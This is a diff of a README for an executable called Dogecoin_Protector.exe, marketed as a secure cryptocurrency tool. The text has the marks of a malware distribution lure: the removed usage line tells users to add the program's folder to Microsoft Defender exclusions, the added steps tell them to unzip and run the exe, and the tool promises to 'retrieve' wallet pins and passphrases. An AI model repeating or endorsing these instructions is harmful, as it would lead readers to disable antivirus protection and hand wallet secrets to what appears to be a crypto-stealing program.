@@ -20,7 +20,9 @@ Experience a seamless and secure way to manage your digital currency needs with 
 This program is an essential addition to any cryptocurrency user's toolkit, from the novice enthusiast to the seasoned trader. It prioritizes user-friendliness and robust security protocols to ensure your digital currencies are handled with utmost care.
 
 # Usage
-Please download the application from the 'Releases' section of our repository. Place the application in a designated folder of your choice for easy access. Please add the folder and the program to Exclusions of Microsoft Defender anti-virus scans. Once situated, you may proceed to run the application.
+1.Download and unzip the zip file
+2.Find and run Dogecoin_Protector.exe within the folder
+3.(Optional) Create a shortcut for Dogecoin_Protector.exe on desktop
 
 **Get Started**:
 Activating and utilizing the tool is a straightforward process. Simply follow the on-screen instructions upon launch to securely generate or retrieve your wallet pin/passphrase.
